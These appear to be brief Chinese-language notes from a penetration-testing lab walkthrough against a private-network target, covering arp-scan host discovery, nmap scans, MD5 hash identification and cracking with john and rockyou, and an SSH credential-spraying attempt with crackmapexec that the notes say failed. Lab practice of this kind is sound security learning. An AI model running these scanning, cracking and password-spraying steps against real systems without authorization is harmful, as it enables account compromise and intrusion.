    一、主机发现

    1. arp-scan -I eth1 -l //-I 指定网卡

      192.168.56.103 08:00:27:66:85:17 PCS Systemtechnik GmbH

    1. sudo nmap –min-rate 10000 -p- 192.168.56.103

    2. sudo nmap -sT -sV -O -p 22,80,110,143 192.168.56.103

    1. 转存hash为1.txt

    2. 利用hash-identifier 来判断是什么hash

      hash-identifier 8a28a94a588a95b80163709ab4313aa4

    3. 尝试爆破密码

      gzip -d /usr/share/wordlists/rockyou.txt.gz
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt 1.txt  > 2

    4. 转存字典

      cat 2|awk -F' ' '{print $1}' > pass
cat 2|awk -F' ' '{print $2}' | awk -F'@' '{print $1}'|awk -F'(' '{print $2}' > user
//-F 指定分隔符

    5. 尝试破解ssh登录

      crackmapexec ssh 192.168.56.103 -u user -p pass  --continue-on-success   //成功后继续尝试

      遗憾的是全部失败
